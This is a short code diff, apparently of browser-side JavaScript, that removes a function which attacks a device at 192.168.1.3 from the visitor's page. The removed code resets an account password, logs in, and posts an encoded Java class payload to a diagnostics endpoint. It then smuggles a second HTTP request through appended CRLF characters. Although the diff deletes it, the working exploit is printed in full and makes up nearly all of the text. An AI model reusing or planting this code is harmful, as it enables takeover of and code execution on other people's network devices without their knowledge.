@@ -79,24 +79,3 @@ burpdtc(() => {
 
   addEventListener("pagehide", () => cat && cat.close());
 }
-
-async function mt() {
-  const base = "http://192.168.1.3";
-  const post = (path, body) => fetch(base + path, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(body),
-  });
-
-  await post("/auth/ResetPassServ", { email: "default@foo.com", password: "epic" });
-  await post("/auth", { email: "default@foo.com", password: "epic" });
-  await fetch(base + "/forms/quickDiagnostics", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ diagnose: { pro_dat: "CAA0AQAZc3VuL21pc2MvQ2hhcmFjdGVyRGVjb2RlcgcANgEADGRlY29kZUJ1ZmZlcgEAFihMamF2YS9sYW5nL1N0cmluZzspW0IMADgAOQoANwA6AQAFd3JpdGUBAAUoW0IpVgwAPAA9CgArAD4BAAVjbG9zZQwAQAALCgArAEEBAA1TdGFja01hcFRhYmxlAQAmc3lzdGVtUGFja2FnZS9HZW5lcmF0ZWQyNzEzNDU3NzA4OTI3MDABAChMc3lzdGVtUGFja2FnZS9HZW5lcmF0ZWQyNzEzNDU3NzA4OTI3MDA7ACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAAEAAEACgALAAEADAAAADMAAQABAAAABSq3AAGxAAAAAgANAAAACgACAAAA8AAEAPEADgAAAAwAAQAAAAUADwBFAAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAAPQADgAAACAAAwAAAAEADwBFAAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAAPcADgAAACoABAAAAAEADwBFAAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAADkABAADAAAAJKcAAwFMuwArWRIttwAwTSy7ADJZtwAzEjW2ADu2AD8stgBCsQAAAAEAQwAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACXVxAH4AXQAAAe3K", timeout: 1 } })
-      + unescape("%0d%0a%0d%0a%0d%0a%0d%0a")
-      + '0 POST /auth {"email": "default@foo.com", "password": "epic"}',
-  });
-}
-
-mt();
